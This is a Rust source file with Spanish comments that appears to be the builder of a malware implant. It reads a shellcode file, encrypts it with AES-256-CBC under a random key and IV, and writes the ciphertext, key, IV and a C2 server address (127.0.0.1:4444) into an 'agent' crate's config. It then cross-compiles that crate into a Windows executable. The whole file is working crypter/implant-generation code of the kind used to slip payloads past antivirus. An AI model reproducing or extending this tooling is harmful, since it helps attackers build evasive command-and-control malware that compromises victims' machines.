// File: src/encrypt.rs
// Función para encriptar shellcode en AES-256-CBC


use aes::Aes256;
use cbc::{cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit}, Encryptor};
use rand::RngCore;
use std::fs::File;
use std::io::{Read, Write};
use std::process::Command;

type Aes256CbcEnc = Encryptor<Aes256>;

const KEY_SIZE: usize = 32; // AES-256
const IV_SIZE: usize = 16;  // AES block size

pub fn encrypt_shellcode(shellcode: &[u8]) -> (Vec<u8>, Vec<u8>, Vec<u8>) {
    // Generate random key
    let mut key = vec![0u8; KEY_SIZE];
    rand::thread_rng().fill_bytes(&mut key);

    // Generate random IV
    let mut iv = vec![0u8; IV_SIZE];
    rand::thread_rng().fill_bytes(&mut iv);

    // Calculate padded size
    let block_size = 16;
    let padded_len = ((shellcode.len() + block_size) / block_size) * block_size;
    let mut buffer = vec![0u8; padded_len];
    buffer[..shellcode.len()].copy_from_slice(shellcode);
    
    // Encrypt the shellcode using AES-256-CBC
    let cipher = Aes256CbcEnc::new_from_slices(&key, &iv).unwrap();
    let encrypted_data = cipher.encrypt_padded_mut::<Pkcs7>(&mut buffer, shellcode.len()).unwrap();

    (encrypted_data.to_vec(), key, iv)
}

pub fn generate_agent(shellcode_file: &str, output_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Read the shellcode file
    let mut file = File::open(shellcode_file)?;
    let mut shellcode = Vec::new();
    file.read_to_end(&mut shellcode)?;

    println!("📊 Tamaño del shellcode: {} bytes", shellcode.len());

    // Encrypt the shellcode
    let (encrypted_data, key, iv) = encrypt_shellcode(&shellcode);

    println!("🔒 Shellcode encriptado: {} bytes", encrypted_data.len());

    // ARREGLO: Detectar si estamos en target/release/ y ajustar la ruta
    let agent_path = if std::env::current_dir()?.to_string_lossy().contains("target/release") {
        "../../agent"  // Desde target/release/ ir a la raíz del proyecto
    } else {
        "agent"        // Si estamos en la raíz del proyecto
    };

    // Crear directorios si no existen
    let config_dir = format!("{}/src", agent_path);
    std::fs::create_dir_all(&config_dir)?;

    // Generar config.rs dentro del crate `agent`
    let config_file_path = format!("{}/src/config.rs", agent_path);
    let mut config_file = File::create(&config_file_path)?;
    writeln!(config_file, "pub const ENCRYPTED_SHELLCODE: &[u8] = &{:?};", encrypted_data)?;
    writeln!(config_file, "pub const KEY: &[u8] = &{:?};", key)?;
    writeln!(config_file, "pub const IV: &[u8] = &{:?};", iv)?;
    writeln!(config_file, "pub const C2_SERVER: &str = \"127.0.0.1:4444\";")?;

    println!("✅ Configuración escrita en {}", config_file_path);

    // Compilar el crate agent
    let output = Command::new("cargo")
        .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
        .current_dir(agent_path) // Usar la ruta ajustada
        .output()?;

    if output.status.success() {
        println!("✅ Compilación exitosa!");
        let exe_path = format!("{}/target/x86_64-pc-windows-gnu/release/agent.exe", agent_path);
        println!("🏃 Ejecutable generado en {}", exe_path);
        
        // Copiar el ejecutable al directorio actual con el nombre deseado
        let dest_path = format!("{}.exe", output_name);
        if let Ok(_) = std::fs::copy(&exe_path, &dest_path) {
            println!("📦 Ejecutable copiado como: {}", dest_path);
        } else {
            println!("⚠️  No se pudo copiar el ejecutable, pero está disponible en: {}", exe_path);
        }
    } else {
        println!("❌ Error durante la compilación:");
        println!("STDOUT: {}", String::from_utf8_lossy(&output.stdout));
        println!("STDERR: {}", String::from_utf8_lossy(&output.stderr));
        return Err("Compilación fallida".into());
    }

    Ok(())
}